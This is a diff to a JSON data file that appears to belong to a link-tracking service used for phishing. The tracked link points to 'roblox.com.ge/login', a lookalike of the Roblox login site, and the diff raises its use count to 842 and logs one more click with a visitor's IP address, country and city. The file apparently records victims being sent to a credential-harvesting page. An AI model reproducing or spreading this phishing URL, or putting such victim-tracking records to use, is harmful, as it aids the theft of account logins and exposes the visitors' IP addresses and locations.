@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 841,
+    "useCount": 842,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6840,6 +6840,14 @@
         "city": "Medan",
         "flag": "🇮🇩",
         "countryCode": "ID"
+      },
+      {
+        "timestamp": 1777175995357,
+        "ip": "66.181.180.132",
+        "country": "Mongolia",
+        "city": "Ulan Bator",
+        "flag": "🇲🇳",
+        "countryCode": "MN"
       }
     ]
   },
